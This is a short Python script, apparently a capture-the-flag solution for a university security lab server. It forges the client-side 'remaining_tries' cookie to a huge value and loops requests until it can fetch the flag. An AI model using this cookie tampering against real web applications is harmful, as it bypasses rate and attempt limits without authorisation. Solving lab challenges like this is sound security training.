import requests
import re

SERVER = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:22054'

# Start session
session = requests.session()
r = session.get(SERVER)

# After seeing that the cookie had a field named "remaining tries"
# Gives more tries to the cookie
session.cookies.set('remaining_tries', '1000000', domain="mustard.stt.rnl.tecnico.ulisboa.pt", path='/')

def get_flag():
    while True:
        r = session.get(SERVER + "/more")
        numbers = re.findall(r'\d+',r.text)
        if numbers[1] == numbers[2]:
            r = session.get(SERVER + "/finish")
            break
        session.close()
    print("The flag is: " + r.text)

get_flag()
